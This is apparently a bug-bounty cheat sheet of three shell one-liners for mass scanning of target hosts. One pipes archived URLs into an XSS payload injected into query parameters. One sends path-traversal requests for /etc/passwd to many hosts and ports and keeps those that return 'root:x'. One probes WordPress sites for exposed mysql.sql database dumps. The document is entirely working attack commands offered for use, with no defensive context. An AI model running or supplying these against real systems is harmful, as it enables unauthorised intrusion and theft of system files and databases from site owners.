# Oneliners

### XSS from waybackurls and qsreplace
`echo https://target.com
 | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq`

### Local File Inclusion using httpx
`cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew lfi-httpx.txt`

### Wordpress Wp-content mysql.sql
`cat hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443 | anew wp-sql.txt`
